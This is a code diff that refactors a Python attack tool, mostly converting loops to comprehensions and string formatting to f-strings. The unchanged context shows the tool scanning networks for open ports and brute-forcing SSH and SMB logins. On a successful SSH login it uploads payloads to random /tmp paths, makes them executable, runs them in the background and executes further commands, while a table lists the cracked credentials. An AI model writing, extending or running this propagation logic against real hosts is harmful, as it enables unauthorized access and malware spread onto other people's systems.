@@ -69,9 +69,11 @@ class TCPScanner(object):
 
     async def scan(self, targets: List[str]) -> None:
         ''' Scans a list of target networks/ips and ports, results are put into open queue '''
-        tasks = []
-        for _ in range(self.max_workers):
-            tasks.append(asyncio.create_task(self._task_worker()))
+        tasks = [
+            asyncio.create_task(self._task_worker())
+            for _ in range(self.max_workers)
+        ]
+
         for ip in self._targets(targets):
             for port in self.open_queues.keys():
                 await self.tcp_queue.put((ip, port))
@@ -115,10 +117,12 @@ class LoginScanner(object):
         self.thread_pool = ThreadPoolExecutor(max_workers=self.max_workers)
 
     async def scan(self):
-        tasks = []
-        tasks.append(asyncio.create_task(self._producer()))
-        for _ in range(self.max_workers):
-            tasks.append(asyncio.create_task(self._task_worker()))
+        tasks = [asyncio.create_task(self._producer())]
+        tasks.extend(
+            asyncio.create_task(self._task_worker())
+            for _ in range(self.max_workers)
+        )
+
         await self.tcp_scan_completed.wait()
         await self.queue.join()
         await self.scan_queue.join()
@@ -165,7 +169,7 @@ class SSHLoginScanner(LoginScanner):
         try:
             ssh.connect(ip, port=port, username=username, password=password, timeout=self.timeout)
             _, stdout, _ = ssh.exec_command('arch', timeout=self.timeout)
-            
+
             arch = stdout.read().decode('utf-8').strip()
             LOG.info('Remote system architecture is %r' % arch)
 
@@ -175,8 +179,8 @@ class SSHLoginScanner(LoginScanner):
                 for upload in self.payloads[arch].get('upload', []):
                     remote_path = '/'.join(['tmp', random_string()])
                     sftp.put(upload, remote_path)
-                    ssh.exec_command('chmod +x %s' % remote_path, timeout=self.timeout)
-                    ssh.exec_command('%s &' % remote_path, timeout=self.timeout)
+                    ssh.exec_command(f'chmod +x {remote_path}', timeout=self.timeout)
+                    ssh.exec_command(f'{remote_path} &', timeout=self.timeout)
                 sftp.close()
 
                 # Execute commands
@@ -188,7 +192,7 @@ class SSHLoginScanner(LoginScanner):
             return True
         except (paramiko.BadAuthenticationType, paramiko.AuthenticationException):
             return False
-        except (paramiko.ssh_exception.SSHException,) as err:
+        except paramiko.ssh_exception.SSHException as err:
             if not is_retry:
                 LOG.warning('SSH protocol exception, retrying attempt ...')
                 time.sleep(round(random.uniform(0.1, 3.0), 2))
@@ -213,7 +217,7 @@ class SMBLoginScanner(LoginScanner):
         LOG.info('[smb worker] Login attempt %s@%s:%d (pw: %s)', username, ip, port, password)
         try:
             stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % ip
-            logging.debug('StringBinding %s' % stringbinding)
+            logging.debug(f'StringBinding {stringbinding}')
             rpc_transport = transport.DCERPCTransportFactory(stringbinding)
             rpc_transport.set_dport(port)
             rpc_transport.setRemoteHost(ip)
@@ -262,7 +266,7 @@ def result_table(index: int, scanner: LoginScanner):
     table.add_column("Password")
     for entry in list(scanner.results):
         table.add_row(*[str(value) for value in entry])
-    title = "%s Logins"  % (scanner.title,)
+    title = f"{scanner.title} Logins"
     return Panel(table, title=title, box=SQUARE, border_style="green")
 
 
@@ -274,12 +278,17 @@ def generate_layout(tcp_scanner, login_scanners):
     )
     layout["upper"].ratio = 4
     upper_columns = [Layout(tcp_table(tcp_scanner), name="tcp")]
-    for index, scanner in enumerate(login_scanners):
-        upper_columns.append(login_scanner_table(index, scanner))
+    upper_columns.extend(
+        login_scanner_table(index, scanner)
+        for index, scanner in enumerate(login_scanners)
+    )
+
     layout["upper"].split_row(*upper_columns)
-    lower_columns = []
-    for index, scanner in enumerate(login_scanners):
-        lower_columns.append(result_table(index, scanner))
+    lower_columns = [
+        result_table(index, scanner)
+        for index, scanner in enumerate(login_scanners)
+    ]
+
     layout["lower"].split_row(*lower_columns)
     return layout
 
@@ -309,11 +318,10 @@ def load_targets(args):
 def load_payloads(args) -> Dict:
     if not args.payloads:
         return {}
-    if os.path.exists(args.payloads) and os.path.isfile(args.payloads):
-        with open(args.payloads) as fp:
-            return json.loads(fp.read())
-    else:
-        raise ValueError('%s is not a valid payload configuration' % args.payloads)
+    if not os.path.exists(args.payloads) or not os.path.isfile(args.payloads):
+        raise ValueError(f'{args.payloads} is not a valid payload configuration')
+    with open(args.payloads) as fp:
+        return json.loads(fp.read())
 
 #
 # > Main
@@ -323,7 +331,7 @@ async def main(args):
 
     # Create per-port/service queues
     ports = [SERVICES[service]['port'] for service in args.services]
-    open_queues = dict((port, asyncio.Queue(),) for port in ports)
+    open_queues = {port: asyncio.Queue() for port in ports}
 
     # Start the TCP scanner
     tcp_scanner = TCPScanner(open_queues, timeout=args.timeout, max_workers=args.max_tcp_workers)
@@ -375,7 +383,7 @@ class ValidatServicesAction(argparse.Action):
     def __call__(self, parser, namespace, values, option_string=None):
         for service in values:
             if service not in SERVICES:
-                raise ValueError('Unsupported service %s' % service)
+                raise ValueError(f'Unsupported service {service}')
         setattr(namespace, self.dest, values)
 
 
